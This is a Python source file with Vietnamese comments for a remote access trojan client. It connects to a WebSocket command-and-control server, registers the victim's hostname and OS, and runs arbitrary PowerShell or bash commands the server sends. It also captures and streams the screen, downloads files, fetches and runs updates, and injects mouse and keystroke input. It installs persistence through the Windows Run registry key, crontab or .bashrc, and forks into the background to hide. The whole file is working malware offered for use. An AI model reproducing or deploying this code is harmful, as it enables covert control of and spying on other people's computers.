import asyncio
import websockets
import json
import uuid
import os
import sys
import platform
import subprocess
import base64
import hashlib
import time
import logging
import shutil
import tempfile
import requests
from pathlib import Path
import psutil
import pyautogui
from PIL import Image
import io
import random

# --- Cấu hình ---
CONFIG_FILE = "config.json"
BOT_ID_FILE = "bot.id"
LOG_FILE = "bot.log"
HEARTBEAT_INTERVAL = 30
RECONNECT_DELAYS = [1, 2, 4, 8, 16, 30, 60]

# --- Logging ---
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {
        "server_url": "wss://your-app.onrender.com/ws",
        "group": "default",
        "version": "1.0.0"
    }

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def get_bot_id():
    if os.path.exists(BOT_ID_FILE):
        with open(BOT_ID_FILE, 'r') as f:
            return f.read().strip()
    bot_id = str(uuid.uuid4())
    with open(BOT_ID_FILE, 'w') as f:
        f.write(bot_id)
    return bot_id

config = load_config()
BOT_ID = get_bot_id()
GROUP = config.get("group", "default")
VERSION = config.get("version", "1.0.0")
SERVER_URL = config.get("server_url")

# --- Các hàm thực thi lệnh ---
def exec_ps(command):
    """Thực thi PowerShell (Windows) hoặc bash (Linux)"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ["powershell", "-Command", command],
                capture_output=True, text=True, shell=False, timeout=30
            )
        else:
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True, text=True, shell=False, timeout=30
            )
        output = result.stdout + result.stderr
        return output.strip() or "No output"
    except Exception as e:
        return f"Error: {str(e)}"

def exec_screenshot():
    """Chụp màn hình, nén JPEG chất lượng 50% -> base64"""
    try:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG", quality=50)
        img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        return f"data:image/jpeg;base64,{img_base64}"
    except Exception as e:
        return f"Error screenshot: {str(e)}"

def exec_ping():
    """Trả về thời gian phản hồi giả lập (ms)"""
    return f"{random.randint(10, 50)}ms"

def exec_download(url, save_path):
    """Tải file từ URL"""
    try:
        r = requests.get(url, timeout=30)
        with open(save_path, 'wb') as f:
            f.write(r.content)
        return f"Downloaded to {save_path} ({len(r.content)} bytes)"
    except Exception as e:
        return f"Download error: {str(e)}"

def exec_update(version):
    """Tải bản cập nhật từ server và tự khởi động lại"""
    try:
        ext = ".exe" if platform.system() == "Windows" else ".py"
        url = f"{config['server_url'].replace('ws', 'http')}/api/download/update/{version}{ext}"
        r = requests.get(url, timeout=60)
        if r.status_code != 200:
            return f"Update failed: HTTP {r.status_code}"
        
        temp_dir = tempfile.gettempdir()
        new_file = os.path.join(temp_dir, f"bot_{version}{ext}")
        with open(new_file, 'wb') as f:
            f.write(r.content)
        
        current_file = sys.argv[0]
        if os.path.exists(current_file):
            with open(current_file, 'rb') as f:
                old_hash = hashlib.md5(f.read()).hexdigest()
            with open(new_file, 'rb') as f:
                new_hash = hashlib.md5(f.read()).hexdigest()
            if old_hash == new_hash:
                return "Update: already latest version"
        
        shutil.copy2(new_file, current_file)
        
        if platform.system() == "Windows":
            os.system(f"start /B {current_file}")
        else:
            os.system(f"nohup python3 {current_file} &")
        return f"Update to version {version} successful, restarting..."
    except Exception as e:
        return f"Update error: {str(e)}"

def exec_cd(path):
    try:
        os.chdir(path)
        return f"Changed to {os.getcwd()}"
    except Exception as e:
        return f"cd error: {str(e)}"

def exec_ls():
    try:
        files = os.listdir('.')
        return "\n".join(files)
    except Exception as e:
        return f"ls error: {str(e)}"

def exec_sleep(seconds):
    try:
        time.sleep(int(seconds))
        return f"Slept {seconds}s"
    except Exception as e:
        return f"Sleep error: {str(e)}"

def exec_kill():
    sys.exit(0)
    return "Killed"

# --- RAT Commands ---
def exec_rat_notepad(text):
    """Mở Notepad và gõ text"""
    try:
        if platform.system() == "Windows":
            subprocess.Popen(["notepad.exe"])
            time.sleep(1.5)
            pyautogui.write(text)
            return f"Notepad opened, wrote {len(text)} chars"
        else:
            subprocess.Popen(["gedit", "--new-window"])
            time.sleep(1.5)
            pyautogui.write(text)
            return f"gedit opened, wrote {len(text)} chars"
    except Exception as e:
        return f"Notepad error: {str(e)}"

def exec_rat_browser(url):
    """Mở trình duyệt với URL"""
    try:
        import webbrowser
        webbrowser.open(url)
        return f"Browser opened: {url}"
    except Exception as e:
        return f"Browser error: {str(e)}"

def exec_rat_event(event_type, *args):
    """Xử lý sự kiện RAT: click, move, key"""
    try:
        pyautogui.FAILSAFE = False
        if event_type == "click":
            if len(args) >= 2:
                x, y = int(args[0]), int(args[1])
                pyautogui.click(x, y)
            else:
                pyautogui.click()
            return "Click sent"
        elif event_type == "rightclick":
            if len(args) >= 2:
                x, y = int(args[0]), int(args[1])
                pyautogui.rightClick(x, y)
            else:
                pyautogui.rightClick()
            return "Right click sent"
        elif event_type == "doubleclick":
            if len(args) >= 2:
                x, y = int(args[0]), int(args[1])
                pyautogui.doubleClick(x, y)
            else:
                pyautogui.doubleClick()
            return "Double click sent"
        elif event_type == "move":
            if len(args) >= 2:
                x, y = int(args[0]), int(args[1])
                pyautogui.moveTo(x, y, duration=0.1)
                return f"Moved to ({x}, {y})"
            return "Move requires x,y"
        elif event_type == "key":
            text = args[0] if args else ""
            pyautogui.typewrite(text)
            return f"Typed: {text[:50]}..."
        else:
            return f"Unknown event: {event_type}"
    except Exception as e:
        return f"Event error: {str(e)}"

def exec_rat_stream():
    """Gửi ảnh màn hình liên tục (stream)"""
    return "Stream started"

def exec_rat_start():
    """Bắt đầu phiên RAT"""
    return "RAT session started"

def exec_rat_stop():
    """Dừng phiên RAT"""
    return "RAT session stopped"

# Bảng ánh xạ lệnh
COMMANDS = {
    "ps": exec_ps,
    "sc": lambda *_: exec_screenshot(),
    "ping": lambda *_: exec_ping(),
    "download": exec_download,
    "update": exec_update,
    "cd": exec_cd,
    "ls": lambda *_: exec_ls(),
    "sleep": exec_sleep,
    "kill": lambda *_: exec_kill(),
    "rat_notepad": exec_rat_notepad,
    "rat_browser": exec_rat_browser,
    "rat_event": exec_rat_event,
    "rat_stream": exec_rat_stream,
    "rat_start": exec_rat_start,
    "rat_stop": exec_rat_stop,
}

# --- Stream handler (gửi ảnh liên tục) ---
async def stream_screenshots(websocket):
    """Gửi ảnh màn hình liên tục qua WebSocket"""
    try:
        while True:
            screenshot = pyautogui.screenshot()
            buffer = io.BytesIO()
            screenshot.save(buffer, format="JPEG", quality=30)
            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            await websocket.send(json.dumps({
                "type": "rat_stream",
                "bot_id": BOT_ID,
                "image": f"data:image/jpeg;base64,{img_base64}",
                "timestamp": time.time()
            }))
            await asyncio.sleep(0.3)
    except Exception as e:
        logging.error(f"Stream error: {e}")

async def handle_command(cmd_data):
    cmd_id = cmd_data.get("cmd_id")
    cmd = cmd_data.get("command")
    args = cmd_data.get("args", [])
    if not cmd:
        return None
    
    parts = cmd.split()
    main_cmd = parts[0]
    if main_cmd not in COMMANDS:
        return {
            "cmd_id": cmd_id,
            "result": f"Unknown command: {main_cmd}",
            "status": "error"
        }
    
    try:
        if main_cmd == "ps":
            result = exec_ps(" ".join(parts[1:]))
        elif main_cmd == "download":
            if len(parts) < 3:
                result = "Usage: download <url> <save_path>"
            else:
                result = exec_download(parts[1], parts[2])
        elif main_cmd == "update":
            version = parts[1] if len(parts) > 1 else VERSION
            result = exec_update(version)
        elif main_cmd == "cd":
            result = exec_cd(parts[1] if len(parts) > 1 else ".")
        elif main_cmd == "sleep":
            result = exec_sleep(parts[1]) if len(parts) > 1 else "Sleep requires seconds"
        elif main_cmd == "kill":
            result = "Killing..."
            asyncio.create_task(self_destruct())
        elif main_cmd.startswith("rat_"):
            if main_cmd == "rat_event":
                result = exec_rat_event(*args)
            elif main_cmd == "rat_notepad":
                result = exec_rat_notepad(" ".join(args))
            elif main_cmd == "rat_browser":
                result = exec_rat_browser(args[0] if args else "https://www.google.com")
            elif main_cmd == "rat_stream":
                result = "Streaming..."
            else:
                result = COMMANDS[main_cmd](*args)
        else:
            result = COMMANDS[main_cmd](*args)
    except Exception as e:
        result = f"Execution error: {str(e)}"
    
    return {
        "cmd_id": cmd_id,
        "result": result,
        "status": "ok"
    }

async def self_destruct():
    await asyncio.sleep(1)
    sys.exit(0)

async def bot_loop():
    reconnect_delay = 0
    try:
        screen = pyautogui.size()
    except:
        screen = type('obj', (object,), {'width': 1920, 'height': 1080})()
    
    while True:
        try:
            async with websockets.connect(SERVER_URL) as websocket:
                logging.info(f"Connected to {SERVER_URL} as {BOT_ID}")
                
                # Đăng ký bot
                await websocket.send(json.dumps({
                    "type": "register",
                    "bot_id": BOT_ID,
                    "group": GROUP,
                    "version": VERSION,
                    "os": platform.system(),
                    "hostname": platform.node(),
                    "screen_width": screen.width if hasattr(screen, 'width') else 1920,
                    "screen_height": screen.height if hasattr(screen, 'height') else 1080
                }))
                reconnect_delay = 0
                
                # Biến để theo dõi stream
                stream_task = None
                
                while True:
                    try:
                        # Heartbeat
                        await websocket.send(json.dumps({
                            "type": "heartbeat",
                            "bot_id": BOT_ID,
                            "timestamp": time.time()
                        }))
                        
                        # Nhận lệnh
                        try:
                            raw = await asyncio.wait_for(websocket.recv(), timeout=HEARTBEAT_INTERVAL)
                            data = json.loads(raw)
                            
                            if data.get("type") == "command":
                                payload = data.get("payload", {})
                                cmd = payload.get("command", "")
                                
                                # Xử lý stream
                                if cmd == "rat_stream":
                                    if stream_task is None or stream_task.done():
                                        stream_task = asyncio.create_task(stream_screenshots(websocket))
                                    await websocket.send(json.dumps({
                                        "type": "result",
                                        "cmd_id": payload.get("cmd_id", ""),
                                        "result": "Stream started",
                                        "status": "ok"
                                    }))
                                elif cmd == "rat_stop":
                                    if stream_task and not stream_task.done():
                                        stream_task.cancel()
                                        stream_task = None
                                    result = exec_rat_stop()
                                    await websocket.send(json.dumps({
                                        "type": "result",
                                        "cmd_id": payload.get("cmd_id", ""),
                                        "result": result,
                                        "status": "ok"
                                    }))
                                else:
                                    # Lệnh thông thường
                                    result = await handle_command(payload)
                                    if result:
                                        await websocket.send(json.dumps({
                                            "type": "result",
                                            "cmd_id": result["cmd_id"],
                                            "result": result["result"],
                                            "status": result["status"]
                                        }))
                                        
                        except asyncio.TimeoutError:
                            pass
                        except websockets.exceptions.ConnectionClosed:
                            logging.warning("Connection closed, reconnecting...")
                            break
                        except Exception as e:
                            logging.error(f"Recv error: {e}")
                            break
                            
                # Cleanup stream task when disconnected
                if stream_task and not stream_task.done():
                    stream_task.cancel()
                    stream_task = None
                
        except Exception as e:
            logging.error(f"Connection error: {e}")
            if reconnect_delay < len(RECONNECT_DELAYS):
                delay = RECONNECT_DELAYS[reconnect_delay]
            else:
                delay = 60
            reconnect_delay += 1
            logging.info(f"Reconnecting in {delay}s...")
            await asyncio.sleep(delay)

# --- Persistence ---
def setup_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "BotClient", 0, winreg.REG_SZ, f'"{sys.executable}" "{sys.argv[0]}"')
            winreg.CloseKey(key)
            logging.info("Persistence added to Windows Registry")
        else:
            script_path = os.path.abspath(sys.argv[0])
            cron_line = f"@reboot python3 {script_path} > /dev/null 2>&1 &\n"
            try:
                with open("/etc/crontab", "a") as f:
                    f.write(cron_line)
                logging.info("Persistence added to crontab")
            except PermissionError:
                try:
                    with open(os.path.expanduser("~/.bashrc"), "a") as f:
                        f.write(f"\npython3 {script_path} &\n")
                    logging.info("Persistence added to .bashrc")
                except:
                    logging.warning("Could not add persistence")
    except Exception as e:
        logging.error(f"Persistence setup error: {e}")

# --- Daemon hóa ---
def daemonize():
    if platform.system() != "Windows":
        try:
            if os.fork() > 0:
                sys.exit(0)
        except OSError as e:
            logging.error(f"Fork failed: {e}")
            sys.exit(1)
        os.setsid()
        os.chdir("/")
        sys.stdout.close()
        sys.stderr.close()

# --- Main ---
if __name__ == "__main__":
    try:
        # Kiểm tra phiên bản Python
        if sys.version_info < (3, 8):
            print("Requires Python 3.8+")
            sys.exit(1)
        
        # Daemon hóa (không dùng cho Windows)
        if platform.system() != "Windows":
            daemonize()
        
        setup_persistence()
        logging.info(f"Bot {BOT_ID} started (version {VERSION})")
        
        try:
            asyncio.run(bot_loop())
        except KeyboardInterrupt:
            logging.info("Bot stopped by user")
        except Exception as e:
            logging.error(f"Loop error: {e}")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        print(f"Fatal error: {e}")